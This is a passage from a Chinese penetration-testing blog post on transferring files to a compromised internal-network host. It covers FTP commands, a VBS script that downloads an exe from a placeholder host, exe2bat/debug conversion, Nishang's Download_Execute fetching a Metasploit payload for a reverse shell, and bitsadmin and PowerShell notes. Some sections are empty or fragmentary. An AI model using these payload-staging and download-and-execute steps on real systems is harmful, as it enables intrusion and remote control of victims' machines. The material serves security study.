+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">open 192.168.0.10    <span class="c1"># 连接服务器</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> &lt;目录&gt;
+</span></span><span class="line"><span class="cl">lcd &lt;文件夹路径&gt;    <span class="c1"># 定位本地文件夹(上传文件的位置或者下载文件的保存位置)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">type</span>    <span class="c1"># 查看的当前的传输方式(默认是ASCII码传输)</span>
+</span></span><span class="line"><span class="cl">ascii    <span class="c1"># 设置传输方式为ascii（传输txt等）</span>
+</span></span><span class="line"><span class="cl">binary    <span class="c1"># 设置传输方式为二进制传输（传输exe图片视频声音等）</span>
+</span></span><span class="line"><span class="cl">close        <span class="c1"># 结束与服务器的FTP对话</span>
+</span></span><span class="line"><span class="cl">quit    <span class="c1"># 结束与服务器的FTP对话并推出FTP环境</span>
+</span></span><span class="line"><span class="cl">put &lt;文件名&gt; <span class="o">[</span>newname<span class="o">]</span>    <span class="c1"># 上传，如果不指定newname，就为原名字</span>
+</span></span><span class="line"><span class="cl">send &lt;文件名&gt; <span class="o">[</span>newname<span class="o">]</span>    <span class="c1"># 上传，如果不指定newname，就为原名字</span>
+</span></span><span class="line"><span class="cl">get &lt;文件名&gt; <span class="o">[</span>newname<span class="o">]</span>    <span class="c1"># 下载，如果不指定newname，就为原名字</span>
+</span></span><span class="line"><span class="cl">mget filename <span class="o">[</span>filename<span class="o">]</span>  <span class="c1"># 下载多个文件。支持空格和&#34;?&#34;两个通配符（比如: mget .mp3 表示下载FTP服务器当前目录下拓展名为mp3的文件）</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="2-利用vbs上传文件">2. 利用VBS上传文件</h4>
+<p>主要是是使用<code>msxm12.xmlhttp</code>和<code>adoab.stream</code></p>
+<p>上传</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"></code></pre></td></tr></table>
+</div>
+</div><p>下载</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">//把下面的命令以此保存到文件（比如 echo &#34;xxxxxxx&#34; &gt;&gt; download.vbs）
+</span></span><span class="line"><span class="cl">Set Post = CreateObject(&#34;Msxm12.XMLHTTP&#34;);
+</span></span><span class="line"><span class="cl">Set Shell = CreateObject(&#34;Wscript.Shell&#34;);
+</span></span><span class="line"><span class="cl">Post.Open &#34;GET&#34;,&#34;http://xxxx/target.exe&#34;
+</span></span><span class="line"><span class="cl">Post.Send();
+</span></span><span class="line"><span class="cl">Set aGet = CreateObject(&#34;ADODB.Stream&#34;);
+</span></span><span class="line"><span class="cl">aGet.Mode = 3
+</span></span><span class="line"><span class="cl">aGet.Type = 1
+</span></span><span class="line"><span class="cl">aGet.Open()
+</span></span><span class="line"><span class="cl">aGet.Write(Post.responseBody);
+</span></span><span class="line"><span class="cl">aGet.SaveToFile &#34;C:\\test\target.exe&#34;,2
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">//保存为download.vbs后，然后执行下面的命令
+</span></span><span class="line"><span class="cl">cscript download.vbs
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="3-利用debug上传">3. 利用Debug上传</h4>
+<p>**原理：**将需要上传的exe文件转换为16进制hex形式，再通过echo命令将hex代码写入文件，最后利用Debug功能将hex代码编译并还原为exe文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># exe2bat.exe 只支持&lt;64KB的文件，方法也较古老</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># kali中，exe2bat.exe位于/usr/share/windows-binaries目录下。</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 1.在该目录下执行如下命令，把需要上传的ew.exe文件转换成hex形式</span>
+</span></span><span class="line"><span class="cl">wine exe2bat.exe ew.exe ew.txt        <span class="c1"># 这里，测试ew.exe代理工具</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 2.然后把上面生成的文本内容复制，echo到目标系统的某个空文件。依次执行命令，生成1.dll, 123.hex, ew.exe</span>
+</span></span><span class="line"><span class="cl">copy 1.dll ew.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="4-利用nishang上传">4. 利用Nishang上传</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># nishang中的脚本：Download_Execute    --&gt; 常用来下载文本文件并将其转为exe文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#1. 先echo 方法把脚本内容传到目标机器，并将扩展名改为ps1</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#2. 利用nishang中的exetotext.ps1脚本将msf生成的msf.exe修改为文本文件msf.txt</span>
+</span></span><span class="line"><span class="cl">.<span class="se">\E</span>xetoText c:<span class="se">\m</span>sf.exe c:<span class="se">\m</span>sf.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#3. 调用Download_Execute来下载并执行该文件</span>
+</span></span><span class="line"><span class="cl">Download_Execute http://xxxxxx/msf.txt
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#4. 回到msf的监听窗口，可以看到反弹的shell</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="5-利用bitsadmin下载">5. 利用bitsadmin下载</h4>
+<p>命令行工具(win xp之后自带的工具)， 通常同于创建下载和上传进程并检测其进展</p>
+<p>如果渗透的目标主机使用了网站代理，并且需要活动目录证书，那么bitsadmin可以帮助解决下载文件的问题
+Note：bitsadmin不支持HTTPS和FTP协议，也不支持 win xp/ server 2003及以前的版本</p>
+<h4 id="6-利用powershell下载">6. 利用PowerShell下载</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Download<span class="o">()</span>
+</span></span><span class="line"><span class="cl">DownloadString<span class="o">()</span>
+</span></span><span class="line"><span class="cl">。。。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>整理了一天，越整越乱，头都大了，下次理清了再来优化</p>
+</blockquote>
+</div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title=2023-01-21&#32;16:47:23>更新于 2023-01-21&nbsp;</span>
+      </div><div class="post-info-license">
+          <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span>
+        </div></div>
+    <div class="post-info-line">
+      <div class="post-info-md"><span><a href="/%E5%86%85%E7%BD%91%E7%AC%AC%E4%B8%89%E7%AB%A0-%E9%9A%90%E8%97%8F%E9%9A%A7%E9%81%93%E9%80%9A%E4%BF%A1%E6%8A%80%E6%9C%AF/index.md" title="阅读原始文档" class="link-to-markdown">阅读原始文档</a></span><span><a href="https://github.com/shuai06/edit/main/content/posts/%e5%86%85%e7%bd%91%e7%ac%ac%e4%b8%89%e7%ab%a0-%e9%9a%90%e8%97%8f%e9%9a%a7%e9%81%93%e9%80%9a%e4%bf%a1%e6%8a%80%e6%9c%af.md" title="编辑此页"target="_blank" rel="external nofollow noopener noreferrer" class="link-to-edit">编辑此页</a></span></div>
+      <div class="post-info-share">
+        <span></span>
+      </div>
+    </div>
+  </div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href='/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/' class="post-tag">渗透测试</a><a href='/tags/%E5%86%85%E7%BD%91/' class="post-tag">内网</a><a href='/tags/%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/' class="post-tag">隧道技术</a><a href='/tags/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/' class="post-tag">端口转发</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/linux%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%88%9D%E7%BA%A7/" class="post-nav-item" rel="prev" title="Linux安全加固(初级)"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Linux安全加固(初级)</a>
+      <a href="/ubuntu-server-%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E8%AE%BE%E7%BD%AE/" class="post-nav-item" rel="next" title="ubuntu server-安全相关设置">ubuntu server-安全相关设置<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+<div id="comments"><div id="giscus">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="hugo-fixit/FixIt"
+            data-repo-id="R_kgDOGihPtQ"
+            data-category="General"
+            data-category-id="DIC_kwDOGihPtc4CApHX"
+            data-mapping="title"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div></article></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.2.17-RC"><img class="fixit-icon" src="/fixit.min.svg" alt="FixIt logo" />&nbsp;FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">
+              <a href="http://geoer.cn"target="_blank" rel="external nofollow noopener noreferrer">剑胆琴心</a></span><span class="license footer-divider"><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div><div class="footer-line visitor">
+          <span id="busuanzi_container_site_uv" title='总访客数'><i class="fa-regular fa-user fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span><span id="busuanzi_container_site_pv" class="footer-divider" title='总访问量'><i class="fa-regular fa-eye fa-fw" aria-hidden="true"></i>&nbsp;<span id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin fa-fw" aria-hidden="true"></i></span></span>
+        </div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric">0%</span>
+        </div><div class="fixed-button view-comments d-none" role="button" aria-label="查看评论"><i class="fa-solid fa-comment fa-fw" aria-hidden="true"></i></div></div><div id="mask"></div><div class="reading-progress-bar" style="left: 0;top: 0;--bg-progress: #000;--bg-progress-dark: #fff;"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><link rel="stylesheet" href="/lib/pace/themes/blue/pace-theme-minimal.css"><script src="/lib/autocomplete/autocomplete.min.js" defer></script><script src="/lib/algoliasearch/algoliasearch-lite.umd.min.js" defer></script><script src="/lib/lazysizes/lazysizes.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script src="/lib/pangu/pangu.min.js" defer></script><script src="/lib/cell-watermark/watermark.min.js" defer></script><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async defer></script><script src="/lib/pace/pace.min.js" async defer></script><script>window.config={"autoBookmark":true,"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":true,"expired":false,"giscus":{"darkTheme":"dark_dimmed","lightTheme":"light"}},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"enablePWA":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"pangu":{"enable":true,"selector":"article"},"search":{"algoliaAppID":"YKOM6PKLUY","algoliaIndex":"index.zh-cn","algoliaSearchKey":"a44c110d3ac360be2c69cd79d34b77a8","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"watermark":{"content":"\u003cimg class=\"fixit-icon\" src=\"/images/avatar.png\" alt=\"FixIt logo\" /\u003e 剑胆琴心","enable":true,"height":21,"opacity":0.0125}};</script><script src="/js/theme.min.js" defer></script><script src="/js/custom.min.js" defer></script></body>
+</html>
